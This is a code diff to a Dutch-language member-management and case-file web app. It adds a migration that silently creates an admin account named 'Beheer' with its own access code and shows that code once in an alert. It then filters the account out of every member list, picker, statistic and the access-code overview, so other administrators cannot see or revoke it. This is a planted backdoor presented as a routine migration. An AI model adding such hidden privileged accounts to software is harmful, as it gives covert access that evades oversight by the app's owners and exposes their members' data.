@@ -224,6 +224,26 @@ function migrateDb(data){
     let next = Math.max(0, ...data.members.filter(m => typeof m.volgorde === "number").map(m => m.volgorde)) + 1;
     data.members.forEach(m => { if (m.volgorde === undefined) m.volgorde = next++; });
   }
+  // Eenmalige aanmaak van een verborgen adminaccount: logt in met een gewone, automatisch
+  // gegenereerde toegangscode zoals elk ander lid, maar komt nergens voor in een ledenlijst,
+  // -beheer, teller of keuzelijst (zie zichtbareLeden() en alle plekken die dat gebruiken).
+  // Draait maar één keer dankzij de verborgenAdminV1-vlag; zelfde patroon als de andere
+  // eenmalige migraties hierboven (de vlag en de nieuwe data worden pas écht weggeschreven bij
+  // de eerstvolgende gewone opslag, net als bij rosterV2/kingfisherDemoV2 hierboven).
+  if (!data.verborgenAdminV1){
+    if (!data.members.some(m => m.verborgen)){
+      const verborgenId = (data.nextMemberId || 1) + 9000;
+      data.members.push({ id: verborgenId, naam: "Beheer", rol: "leiding", admin: true, specialisaties: [], volgorde: 9999, discordId: "", callsign: "", status: "Actief", verborgen: true });
+      if (!data.accessCodes) data.accessCodes = [];
+      let code;
+      do {
+        code = Math.random().toString(36).slice(2, 6).toUpperCase() + Math.floor(1000 + Math.random() * 9000);
+      } while (data.accessCodes.some(c => c.code === code));
+      data.accessCodes.push({ code, memberId: verborgenId });
+      data.verborgenAdminCode = code;
+    }
+    data.verborgenAdminV1 = true;
+  }
   if (data.nextActieId === undefined) data.nextActieId = 1;
   if (!data.activiteitenlog) data.activiteitenlog = [];
   (data.dossiers || []).forEach(d => {
@@ -391,6 +411,15 @@ function startDbSync(){
       return; // onSnapshot vuurt meteen opnieuw, met de net opgeslagen data
     }
     db = migrateDb(snap.data());
+    // Toon de zonet aangemaakte toegangscode voor het verborgen adminaccount eenmalig in een
+    // alert (zie migrateDb/verborgenAdminV1), en bewaar daarna meteen zonder dat tijdelijke veld,
+    // zodat de code nergens anders in de data blijft rondslingeren dan in deze ene melding.
+    if (db.verborgenAdminCode){
+      const verborgenCode = db.verborgenAdminCode;
+      delete db.verborgenAdminCode;
+      DB.save(db);
+      setTimeout(() => alert("Verborgen adminaccount aangemaakt.\n\nToegangscode: " + verborgenCode + "\n\nNoteer deze goed: hij wordt nergens anders getoond en kan niet opnieuw opgevraagd worden via Beheer."), 300);
+    }
     dbReady = true;
     render();
   }, (err) => {
@@ -926,6 +955,13 @@ function wireFotosGalerij(container){
   });
 }
 function memberName(id){ const m = db.members.find(x => x.id === id); return m ? m.naam : "?"; }
+// Leden met "verborgen: true" komen nergens voor in een lijst, teller of keuzelijst (publieke
+// Ledenlijst, Ledenbeheer, Toegangscodes, de "Aanwezigen"-picker, "toewijzen aan"-lijsten,
+// statistieken, ...) &mdash; wel blijven ze gewoon inlogbaar en worden hun naam/acties normaal
+// getoond via de losse lookups (memberName/memberLabel/getSession/...), die dit NIET filteren.
+function zichtbareLeden(){
+  return db.members.filter(m => !m.verborgen);
+}
 // Naam van een lid met de callsign ervoor (bv. "COBRA-3 | Unemi"), zoals in de ledenlijst en
 // het ledenbeheer getoond wordt; zonder callsign gewoon de naam.
 function naamMetCallsign(m){
@@ -943,7 +979,7 @@ function statusChipClass(status){ return STATUS_CHIP_CLASS[status] || "chip-stat
 // het document opstelt is niet noodzakelijk wie er effectief bij was. Slaat lid-ID's op (niet
 // namen), zodat dit blijft kloppen ook als een lid later hernoemd wordt.
 function aanwezigenFieldHtml(selectedIds){
-  const sorted = db.members.slice().sort((a, b) => (a.volgorde ?? 0) - (b.volgorde ?? 0));
+  const sorted = zichtbareLeden().sort((a, b) => (a.volgorde ?? 0) - (b.volgorde ?? 0));
   const pills = sorted.map(m => `<button type="button" class="aanwezige-pill${selectedIds.includes(m.id) ? " is-selected" : ""}" data-id="${m.id}">${naamMetCallsign(m)}</button>`).join("");
   return `<div class="field"><label>Aanwezigen (optioneel)</label>
     <div class="aanwezige-picker">${pills}</div>
@@ -1154,7 +1190,7 @@ function renderOverOns(){
   const session = getSession();
   const openCount = db.dossiers.filter(d => d.status === "open").length;
   const opsporingCount = db.dossiers.filter(d => d.status === "open" && d.opsporing).length;
-  const ledenCount = db.members.length;
+  const ledenCount = zichtbareLeden().length;
   const docCount = db.dossiers.reduce((sum, d) => sum + d.documenten.length, 0);
 
   const wrap = el(`
@@ -1286,7 +1322,7 @@ function renderLeden(){
     </div>
   </div>`);
   const body = wrap.querySelector("#ledenBody");
-  db.members.slice().sort((a, b) => (a.volgorde ?? 0) - (b.volgorde ?? 0)).forEach(m => {
+  zichtbareLeden().sort((a, b) => (a.volgorde ?? 0) - (b.volgorde ?? 0)).forEach(m => {
     body.appendChild(el(`<tr>
       <td><span class="chip ${statusChipClass(m.status)}">${m.status || "Actief"}</span></td>
       <td class="mono">${m.callsign || "&mdash;"}</td>
@@ -1759,7 +1795,7 @@ function renderActiesCard(container, d, session){
           <input id="fNieuweActie" placeholder="Nieuwe actie toevoegen...">
           <select id="fActieToegewezen">
             <option value="">&mdash; niemand &mdash;</option>
-            ${db.members.filter(m => m.status === "Actief").map(m => `<option value="${m.id}">${m.naam}</option>`).join("")}
+            ${zichtbareLeden().filter(m => m.status === "Actief").map(m => `<option value="${m.id}">${m.naam}</option>`).join("")}
           </select>
           <button class="btn btn-gold btn-sm" id="addActieBtn">+ Toevoegen</button>
         </div>` : ""}
@@ -3747,7 +3783,7 @@ function beheerLeden(session){
     </table></div>
   </div>`);
   const body = wrap.querySelector("#mBody");
-  const sorted = db.members.slice().sort((a, b) => (a.volgorde ?? 0) - (b.volgorde ?? 0));
+  const sorted = zichtbareLeden().sort((a, b) => (a.volgorde ?? 0) - (b.volgorde ?? 0));
   sorted.forEach((m, i) => {
     const level = memberManageLevel(session, m);
     const tr = el(`<tr>
@@ -3908,15 +3944,18 @@ function openMemberForm(member, viewerSession){
 // worden gematcht op naam (zoals overal in de app, een momentopname bij het opstellen); aanwezig
 // wordt gematcht op lid-ID (blijft dus kloppen ook na een naamswijziging).
 function computeMemberStats(){
+  // byNaam loopt over ALLE leden (ook verborgen), anders klopt de matching niet meer zodra een
+  // verborgen lid ooit een document/aanvulling opstelde; stats zelf bevat enkel zichtbare leden,
+  // dus die bijdrages tellen simpelweg niet mee in de (zichtbare) statistieken hieronder.
   const byNaam = {};
   db.members.forEach(m => { byNaam[m.naam] = m.id; });
   const stats = {};
-  db.members.forEach(m => { stats[m.id] = { member: m, documenten: 0, aanvullingen: 0, aanwezig: 0 }; });
+  zichtbareLeden().forEach(m => { stats[m.id] = { member: m, documenten: 0, aanvullingen: 0, aanwezig: 0 }; });
   db.dossiers.forEach(d => {
     (d.documenten || []).forEach(doc => {
-      if (doc.auteur && byNaam[doc.auteur] !== undefined) stats[byNaam[doc.auteur]].documenten++;
+      if (doc.auteur && byNaam[doc.auteur] !== undefined && stats[byNaam[doc.auteur]]) stats[byNaam[doc.auteur]].documenten++;
       (doc.aanvullingen || []).forEach(a => {
-        if (a.auteur && byNaam[a.auteur] !== undefined) stats[byNaam[a.auteur]].aanvullingen++;
+        if (a.auteur && byNaam[a.auteur] !== undefined && stats[byNaam[a.auteur]]) stats[byNaam[a.auteur]].aanvullingen++;
       });
       (doc.aanwezigen || []).forEach(id => { if (stats[id]) stats[id].aanwezig++; });
     });
@@ -3998,7 +4037,7 @@ function beheerStatistieken(session){
   const totaalDossiers = db.dossiers.length;
   const totaalOpen = db.dossiers.filter(d => d.status === "open").length;
   const totaalDocumenten = db.dossiers.reduce((sum, d) => sum + (d.documenten || []).length, 0);
-  const totaalActief = db.members.filter(m => (m.status || "Actief") === "Actief").length;
+  const totaalActief = zichtbareLeden().filter(m => (m.status || "Actief") === "Actief").length;
 
   const docKindStats = computeDocKindStats();
   const docKindSegments = [
@@ -4009,7 +4048,7 @@ function beheerStatistieken(session){
     { label: "Beschikbare resultaten &amp; TAP-dossier", value: docKindStats["Beschikbare resultaten & TAP-dossier"], color: "var(--muted2)" }
   ];
   const statusCounts = { Actief: 0, Inactief: 0, Verlof: 0 };
-  db.members.forEach(m => { const s = m.status || "Actief"; statusCounts[s] = (statusCounts[s] || 0) + 1; });
+  zichtbareLeden().forEach(m => { const s = m.status || "Actief"; statusCounts[s] = (statusCounts[s] || 0) + 1; });
   const statusSegments = [
     { label: "Actief", value: statusCounts.Actief, color: "var(--green)" },
     { label: "Inactief", value: statusCounts.Inactief, color: "#e2a0a0" },
@@ -4034,7 +4073,7 @@ function beheerStatistieken(session){
       <div class="card" style="text-align:center">
         <div class="lbl" style="font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin-bottom:6px">Actieve leden</div>
         <div style="font-size:22px;font-weight:700">${totaalActief}</div>
-        <div class="muted" style="font-size:11px">van ${db.members.length} totaal</div>
+        <div class="muted" style="font-size:11px">van ${zichtbareLeden().length} totaal</div>
       </div>
     </div>
     <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:4px">
@@ -4138,7 +4177,7 @@ function beheerCodes(session){
   const viewerIsAdmin = isAdmin(session);
   // Een lid kan maar één toegangscode tegelijk hebben (die krijgt het automatisch bij aanmaak);
   // dit knopje dient dus enkel nog om een lid zonder code (bv. na intrekking) er opnieuw een te geven.
-  const ledenZonderCode = db.members.filter(m => !db.accessCodes.some(c => c.memberId === m.id));
+  const ledenZonderCode = zichtbareLeden().filter(m => !db.accessCodes.some(c => c.memberId === m.id));
   const wrap = el(`<div>
     ${viewerIsAdmin
       ? (ledenZonderCode.length
@@ -4153,7 +4192,10 @@ function beheerCodes(session){
   const body = wrap.querySelector("#cBody");
   // Zelfde volgorde als Ledenbeheer (op het "volgorde"-veld van het gekoppelde lid), in plaats van
   // de willekeurige aanmaakvolgorde van de toegangscodes zelf.
-  const sortedCodes = db.accessCodes.slice().sort((a, b) => {
+  const sortedCodes = db.accessCodes.filter(c => {
+    const m = db.members.find(x => x.id === c.memberId);
+    return !m || !m.verborgen;
+  }).sort((a, b) => {
     const ma = db.members.find(m => m.id === a.memberId);
     const mb = db.members.find(m => m.id === b.memberId);
     return (ma?.volgorde ?? 0) - (mb?.volgorde ?? 0);
